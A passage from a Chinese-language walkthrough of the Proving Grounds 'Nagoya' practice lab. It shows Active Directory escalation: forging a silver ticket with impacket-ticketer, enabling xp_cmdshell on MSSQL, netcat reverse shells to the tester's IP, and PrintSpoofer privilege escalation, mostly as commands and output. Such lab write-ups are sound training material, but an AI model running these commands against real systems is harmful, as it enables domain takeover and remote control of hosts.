    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><blockquote>
<p><strong>Escalation</strong></p>
<p>Perform kerberoast, crack the password of service account for mssql. Use everything you gathered to forge a silver ticket. Elevate your privileges on mssql by impersonating to administrator using the silver ticket.</p>
</blockquote>
<h3 id="白银票据" class="heading-element"><span>白银票据</span>
  <a href="#%e7%99%bd%e9%93%b6%e7%a5%a8%e6%8d%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>因为现在已经有svc_mssql的账户密码，可以考虑通过白银票据传递，模拟高权限的管理员。</p>
<p>回顾白银票据的利用条件，需要如下信息：</p>
<ul>
<li>要伪造的域用户（一般是域管理员账户）: Administrator</li>
<li>域名 :  nagoya-industries.com</li>
<li>域的SID值</li>
<li>可利用的服务 : MSSQL</li>
<li>目标服务的SPN</li>
<li>目标服务账户的NTLM哈希</li>
</ul>
<p>现在还需要域的SID、MSSQL服务的SPN，svc_mssql的NTLM Hash</p>
<p>目前已有svc_mssql的明文密码，使用https://codebeautify.org/ntlm-hash-generator 生成 NTLM Hash，</p>
<p><a class="lightgallery" href="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207200813012.png?size=large" data-thumbnail="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207200813012.png?size=small" data-sub-html="<h2>image-20240207200813012</h2>"><img loading="lazy" src="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207200813012.png" alt="image-20240207200813012" srcset="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207200813012.png?size=small, /posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207200813012.png?size=medium 1.5x, /posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207200813012.png?size=large 2x" data-title="image-20240207200813012" style="--width: 1246px;--aspect-ratio: 1246 / 864;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>域的SID通过powershell查询</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\t</span>mp&gt; Get-ADDomain
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">AllowedDNSSuffixes                 : <span class="o">{}</span>
</span></span><span class="line"><span class="cl">ChildDomains                       : <span class="o">{}</span>
</span></span><span class="line"><span class="cl">ComputersContainer                 : <span class="nv">CN</span><span class="o">=</span>Computers,DC<span class="o">=</span>nagoya-industries,DC<span class="o">=</span>com
</span></span><span class="line"><span class="cl">DeletedObjectsContainer            : <span class="nv">CN</span><span class="o">=</span>Deleted Objects,DC<span class="o">=</span>nagoya-industries,DC<span class="o">=</span>com
</span></span><span class="line"><span class="cl">DistinguishedName                  : <span class="nv">DC</span><span class="o">=</span>nagoya-industries,DC<span class="o">=</span>com
</span></span><span class="line"><span class="cl">DNSRoot                            : nagoya-industries.com
</span></span><span class="line"><span class="cl">DomainControllersContainer         : <span class="nv">OU</span><span class="o">=</span>Domain Controllers,DC<span class="o">=</span>nagoya-industries,DC<span class="o">=</span>com
</span></span><span class="line"><span class="cl">DomainMode                         : Windows2016Domain
</span></span><span class="line"><span class="cl">DomainSID                          : S-1-5-21-1969309164-1513403977-1686805993
</span></span><span class="line"><span class="cl">ForeignSecurityPrincipalsContainer : <span class="nv">CN</span><span class="o">=</span>ForeignSecurityPrincipals,DC<span class="o">=</span>nagoya-industries,DC<span class="o">=</span>com
</span></span><span class="line"><span class="cl">Forest                             : nagoya-industries.com
</span></span><span class="line"><span class="cl">InfrastructureMaster               : nagoya.nagoya-industries.com
</span></span><span class="line"><span class="cl">LastLogonReplicationInterval       :
</span></span><span class="line"><span class="cl">LinkedGroupPolicyObjects           : <span class="o">{</span><span class="nv">CN</span><span class="o">={</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>,CN<span class="o">=</span>Policies,CN<span class="o">=</span>System,DC<span class="o">=</span>nagoya-industries,DC<span class="o">=</span>com<span class="o">}</span>
</span></span><span class="line"><span class="cl">LostAndFoundContainer              : <span class="nv">CN</span><span class="o">=</span>LostAndFound,DC<span class="o">=</span>nagoya-industries,DC<span class="o">=</span>com
</span></span><span class="line"><span class="cl">ManagedBy                          :
</span></span><span class="line"><span class="cl">Name                               : nagoya-industries
</span></span><span class="line"><span class="cl">NetBIOSName                        : NAGOYA-IND
</span></span><span class="line"><span class="cl">ObjectClass                        : domainDNS
</span></span><span class="line"><span class="cl">ObjectGUID                         : 1153c877-efa1-443b-b59f-c32c9286750e
</span></span><span class="line"><span class="cl">ParentDomain                       :
</span></span><span class="line"><span class="cl">PDCEmulator                        : nagoya.nagoya-industries.com
</span></span><span class="line"><span class="cl">PublicKeyRequiredPasswordRolling   : True
</span></span><span class="line"><span class="cl">QuotasContainer                    : <span class="nv">CN</span><span class="o">=</span>NTDS Quotas,DC<span class="o">=</span>nagoya-industries,DC<span class="o">=</span>com
</span></span><span class="line"><span class="cl">ReadOnlyReplicaDirectoryServers    : <span class="o">{}</span>
</span></span><span class="line"><span class="cl">ReplicaDirectoryServers            : <span class="o">{</span>nagoya.nagoya-industries.com<span class="o">}</span>
</span></span><span class="line"><span class="cl">RIDMaster                          : nagoya.nagoya-industries.com
</span></span><span class="line"><span class="cl">SubordinateReferences              : <span class="o">{</span><span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>nagoya-industries,DC<span class="o">=</span>com, <span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>nagoya-industries,DC<span class="o">=</span>com, <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>nagoya-industries,DC<span class="o">=</span>com<span class="o">}</span>
</span></span><span class="line"><span class="cl">SystemsContainer                   : <span class="nv">CN</span><span class="o">=</span>System,DC<span class="o">=</span>nagoya-industries,DC<span class="o">=</span>com
</span></span><span class="line"><span class="cl">UsersContainer                     : <span class="nv">CN</span><span class="o">=</span>Users,DC<span class="o">=</span>nagoya-industries,DC<span class="o">=</span>com</span></span></code></pre></td></tr></table>
</div>
</div><p>MSSQL服务的SPN 也用Powershell查询</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\t</span>mp&gt; Get-ADUser -Filter <span class="o">{</span>SamAccountName -eq <span class="s2">&#34;svc_mssql&#34;</span><span class="o">}</span> -Properties ServicePrincipalNames
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">DistinguishedName     : <span class="nv">CN</span><span class="o">=</span>svc_mssql,CN<span class="o">=</span>Users,DC<span class="o">=</span>nagoya-industries,DC<span class="o">=</span>com
</span></span><span class="line"><span class="cl">Enabled               : True
</span></span><span class="line"><span class="cl">GivenName             : svc_mssql
</span></span><span class="line"><span class="cl">Name                  : svc_mssql
</span></span><span class="line"><span class="cl">ObjectClass           : user
</span></span><span class="line"><span class="cl">ObjectGUID            : df7dda21-173f-4a4a-88ed-70d69481b46e
</span></span><span class="line"><span class="cl">SamAccountName        : svc_mssql
</span></span><span class="line"><span class="cl">ServicePrincipalNames : <span class="o">{</span>MSSQL/nagoya.nagoya-industries.com<span class="o">}</span>
</span></span><span class="line"><span class="cl">SID                   : S-1-5-21-1969309164-1513403977-1686805993-1136
</span></span><span class="line"><span class="cl">Surname               :
</span></span><span class="line"><span class="cl">UserPrincipalName     : svc_mssql@nagoya-industries.com</span></span></code></pre></td></tr></table>
</div>
</div><p>最后得到所需的内容如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">NTLM Hash: E3A0168BC21CFB88B95C954A5B18F57C
</span></span><span class="line"><span class="cl">Domain SID: S-1-5-21-1969309164-1513403977-1686805993
</span></span><span class="line"><span class="cl">Service SPN: {MSSQL/nagoya.nagoya-industries.com}</span></span></code></pre></td></tr></table>
</div>
</div><p>准备工作完成，那就尝试生成白银票据</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Nagoya<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id <span class="m">500</span> Administrator</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="lightgallery" href="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207202111455.png?size=large" data-thumbnail="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207202111455.png?size=small" data-sub-html="<h2>image-20240207202111455</h2>"><img loading="lazy" src="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207202111455.png" alt="image-20240207202111455" srcset="/posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207202111455.png?size=small, /posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207202111455.png?size=medium 1.5x, /posts/provinggrounds-nagoya/resource/22-W-H-Nagoya.assets/image-20240207202111455.png?size=large 2x" data-title="image-20240207202111455" style="--width: 1173px;--aspect-ratio: 1173 / 295;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>接下去导入票据，连接</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Nagoya<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/Administrator.ccache
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Nagoya<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ klist
</span></span><span class="line"><span class="cl">Ticket cache: FILE:/home/xavier/Desktop/OSCP/PG_Practice/Nagoya/Administrator.ccache
</span></span><span class="line"><span class="cl">Default principal: Administrator@NAGOYA-INDUSTRIES.COM
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Valid starting       Expires              Service principal
</span></span><span class="line"><span class="cl">2024-02-07T20:20:46  2034-02-04T20:20:46  MSSQL/nagoya.nagoya-industries.com@NAGOYA-INDUSTRIES.COM
</span></span><span class="line"><span class="cl">        renew <span class="k">until</span> 2034-02-04T20:20:46</span></span></code></pre></td></tr></table>
</div>
</div><p>编辑 /etc/hosts 和 /etc/krb5user.conf</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># /etc/hosts</span>
</span></span><span class="line"><span class="cl">127.0.0.1       nagoya.nagoya-industries.com nagoya-industries.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># /etc/krb5user.conf</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>libdefaults<span class="o">]</span>
</span></span><span class="line"><span class="cl">        <span class="nv">default_realm</span> <span class="o">=</span> NAGOYA-INDUSTRIES.COM
</span></span><span class="line"><span class="cl">        <span class="nv">kdc_timesync</span> <span class="o">=</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl">        <span class="nv">ccache_type</span> <span class="o">=</span> <span class="m">4</span>
</span></span><span class="line"><span class="cl">        <span class="nv">forwardable</span> <span class="o">=</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl">        <span class="nv">proxiable</span> <span class="o">=</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl">    <span class="nv">rdns</span> <span class="o">=</span> <span class="nb">false</span>
</span></span><span class="line"><span class="cl">    <span class="nv">dns_canonicalize_hostname</span> <span class="o">=</span> <span class="nb">false</span>
</span></span><span class="line"><span class="cl">        fcc-mit-ticketflags <span class="o">=</span> <span class="nb">true</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>realms<span class="o">]</span>        
</span></span><span class="line"><span class="cl">        NAGOYA-INDUSTRIES.COM <span class="o">=</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">kdc</span> <span class="o">=</span> nagoya.nagoya-industries.com
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>domain_realm<span class="o">]</span>
</span></span><span class="line"><span class="cl">        .nagoya-industries.com <span class="o">=</span> NAGOYA-INDUSTRIES.COM</span></span></code></pre></td></tr></table>
</div>
</div><p>连接mssql服务</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Nagoya<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ impacket-mssqlclient -k nagoya.nagoya-industries.com
</span></span><span class="line"><span class="cl">Impacket v0.10.0 - Copyright <span class="m">2022</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Encryption required, switching to TLS
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: <span class="m">16192</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>nagoya<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: Changed database context to <span class="s1">&#39;master&#39;</span>.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>nagoya<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: Changed language setting to us_english.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ACK: Result: <span class="m">1</span> - Microsoft SQL Server <span class="o">(</span><span class="m">160</span> 3232<span class="o">)</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
</span></span><span class="line"><span class="cl">SQL&gt; <span class="k">select</span> system_user<span class="p">;</span>
</span></span><span class="line"><span class="cl">--------------------------------------
</span></span><span class="line"><span class="cl">NAGOYA-IND<span class="se">\A</span>dministrator</span></span></code></pre></td></tr></table>
</div>
</div><p>成功开启并执行xp_cmdshell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">SQL&gt; <span class="nb">exec</span> xp_cmdshell <span class="s1">&#39;whoami&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> ERROR<span class="o">(</span>nagoya<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: SQL Server blocked access to procedure <span class="s1">&#39;sys.xp_cmdshell&#39;</span> of component <span class="s1">&#39;xp_cmdshell&#39;</span> because this component is turned off as part of the security configuration <span class="k">for</span> this server. A system administrator can <span class="nb">enable</span> the use of <span class="s1">&#39;xp_cmdshell&#39;</span> by using sp_configure. For more information about enabling <span class="s1">&#39;xp_cmdshell&#39;</span>, search <span class="k">for</span> <span class="s1">&#39;xp_cmdshell&#39;</span> in SQL Server Books Online.
</span></span><span class="line"><span class="cl">SQL&gt; EXEC sp_configure <span class="s1">&#39;show advanced options&#39;</span>, 1<span class="p">;</span>RECONFIGURE<span class="p">;</span>EXEC sp_configure <span class="s1">&#39;xp_cmdshell&#39;</span>, 1<span class="p">;</span>RECONFIGURE<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>nagoya<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 196: Configuration option <span class="s1">&#39;show advanced options&#39;</span> changed from <span class="m">0</span> to 1. Run the RECONFIGURE statement to install.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>nagoya<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 196: Configuration option <span class="s1">&#39;xp_cmdshell&#39;</span> changed from <span class="m">0</span> to 1. Run the RECONFIGURE statement to install.
</span></span><span class="line"><span class="cl">SQL&gt; <span class="nb">exec</span> xp_cmdshell <span class="s1">&#39;whoami&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">output
</span></span><span class="line"><span class="cl">-------  
</span></span><span class="line"><span class="cl">nagoya-ind<span class="se">\s</span>vc_mssql
</span></span><span class="line"><span class="cl">NULL
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">SQL&gt;</span></span></code></pre></td></tr></table>
</div>
</div><p>执行反弹shell到nc</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">SQL&gt; <span class="nb">exec</span> xp_cmdshell <span class="s1">&#39;C:\tmp\nc64.exe 192.168.45.193 4444 -e powershell&#39;</span><span class="p">;</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Nagoya<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ nc -nlvp <span class="m">4444</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.45.193<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.166.21<span class="o">]</span> <span class="m">50232</span>
</span></span><span class="line"><span class="cl">Windows PowerShell 
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; whoami
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">nagoya-ind<span class="se">\s</span>vc_mssql
</span></span><span class="line"><span class="cl">PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; </span></span></code></pre></td></tr></table>
</div>
</div><p>检查当前用户权限：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">PS C:<span class="se">\t</span>mp&gt; whoami /priv
</span></span><span class="line"><span class="cl">whoami /priv
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
</span></span><span class="line"><span class="cl">----------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Privilege Name                Description                               <span class="nv">State</span>   
</span></span><span class="line"><span class="cl"><span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
</span></span><span class="line"><span class="cl">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
</span></span><span class="line"><span class="cl">SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for</span> a process        Disabled
</span></span><span class="line"><span class="cl">SeMachineAccountPrivilege     Add workstations to domain                Disabled
</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
</span></span><span class="line"><span class="cl">SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
</span></span><span class="line"><span class="cl">SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
</span></span><span class="line"><span class="cl">SeCreateGlobalPrivilege       Create global objects                     Enabled 
</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set</span>            Disabled</span></span></code></pre></td></tr></table>
</div>
</div><p>发现有SeImpersonatePrivilege，可以利用提权，上传 PrintSpoofer64.exe 进行提权</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\tmp&gt; .\PrintSpoofer64.exe -c &#34;C:\tmp\nc64.exe 192.168.45.193 5555 -e powershell&#34;
</span></span><span class="line"><span class="cl">.\PrintSpoofer64.exe -c &#34;C:\tmp\nc64.exe 192.168.45.193 5555 -e powershell&#34;
</span></span><span class="line"><span class="cl">[+] Found privilege: SeImpersonatePrivilege
</span></span><span class="line"><span class="cl">[+] Named pipe listening...
</span></span><span class="line"><span class="cl">[+] CreateProcessAsUser() OK</span></span></code></pre></td></tr></table>
</div>
</div><p>nc收到反弹shell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Nagoya<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ nc -nlvp <span class="m">5555</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">5555</span> ...
